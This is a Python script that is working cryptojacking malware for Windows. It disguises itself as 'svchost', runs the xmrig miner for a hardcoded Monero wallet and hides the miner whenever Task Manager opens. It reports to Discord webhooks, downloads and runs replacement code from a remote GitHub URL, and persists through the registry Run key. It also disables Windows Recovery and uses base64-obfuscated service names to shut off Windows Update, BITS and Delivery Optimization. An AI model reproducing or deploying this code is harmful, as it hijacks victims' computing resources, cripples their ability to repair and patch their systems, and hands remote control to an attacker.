import os, sys, subprocess, random, time, winreg, ctypes, json, platform, threading, base64
from urllib import request

# --- CONFIG (V8.2 - THE SABOTAGE HYDRA) ---
W_S = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
W_M = "https://discord.com/api/webhooks/1503876364632326145/YlQ62WNi8sPvYeiAfT9nIB25FPR4k-MoP71QSENKu06xUNIAJWbiXKJJ-7pa1foOfl4HB"
ID = "svchost"
WORK_DIR = os.path.dirname(os.path.realpath(__file__))
MIN_BIN = os.path.join(WORK_DIR, "xmrig.exe")
WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
POOL = "pool.supportxmr.com:443"
RAW_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"

# Services to lock down (Windows Update, BITS, Delivery Optimization)
SVC_L = ["d3VhdXNlcnY=", "Yml0cw==", "ZG9zdmM="] 

def notify(msg, type="sys"):
    hook = W_S if type == "sys" else W_M
    try:
        data = json.dumps({"content": f"**[{platform.node()} | {ID}]**: {msg}"}).encode('utf-8')
        req = request.Request(hook, data=data, headers={'Content-Type': 'application/json'})
        request.urlopen(req, timeout=10)
    except: pass

def auto_update():
    while True:
        try:
            time.sleep(43200) # 12 Hours
            with request.urlopen(RAW_URL) as response:
                new_code = response.read().decode('utf-8')
            with open(os.path.realpath(__file__), 'r') as f:
                current_code = f.read()
            if new_code != current_code:
                with open(os.path.realpath(__file__), 'w') as f:
                    f.write(new_code)
                notify("Evolution triggered. Restarting engine.", "sys")
                os.execv(sys.executable, ['python'] + sys.argv)
        except: pass

def engage_locks():
    """V6.3 Sabotage Logic: Disable Recovery and Update Services"""
    try:
        # Disable Windows Recovery Environment
        subprocess.run(["reagentc", "/disable"], capture_output=True, creationflags=0x08000000)
        
        # Disable Update Services
        for s in SVC_L:
            name = base64.b64decode(s).decode()
            subprocess.run(["sc", "config", name, "start=disabled"], capture_output=True, creationflags=0x08000000)
            subprocess.run(["sc", "stop", name], capture_output=True, creationflags=0x08000000)
        notify("System Lockdown Verified (Recovery/Updates Disabled).", "sys")
    except: pass

def is_running(name):
    try:
        output = subprocess.check_output(['tasklist', '/NH', '/FO', 'CSV', '/FI', f'IMAGENAME eq {name}'], creationflags=0x08000000).decode()
        return name.lower() in output.lower()
    except: return False

def engage_persistence():
    try:
        run_p = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_p, 0, winreg.KEY_SET_VALUE)
        # Pointing to the ctfmon mask
        winreg.SetValueEx(key, ID, 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.realpath(__file__)}"')
        winreg.CloseKey(key)
    except: pass

class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]

def get_idle():
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
        return (ctypes.windll.kernel32.GetTickCount() - lii.dwTime) / 1000.0
    return 0

def manage():
    if is_running("Taskmgr.exe"):
        subprocess.run(['taskkill', '/F', '/IM', 'xmrig.exe'], creationflags=0x08000000, capture_output=True)
    else:
        idle = get_idle()
        pwr = "90" if idle > 300 else "25"
        if not is_running("xmrig.exe") and os.path.exists(MIN_BIN):
            subprocess.Popen([MIN_BIN, "-o", POOL, "-u", f"{WALLET}.{platform.node()}", "--max-cpu-usage", pwr, "-k", "--tls"], creationflags=0x08000000)
            notify(f"Engine Engaged. Power: {pwr}%", "mine")

def main():
    threading.Thread(target=auto_update, daemon=True).start()
    engage_locks() # Teeth Engaged
    time.sleep(random.randint(5, 15))
    engage_persistence()
    notify("SYSTEM ONLINE (v8.2 - Sabotage Hydra Active)", "sys")
    while True:
        manage()
        time.sleep(15)

if __name__ == "__main__":
    main()
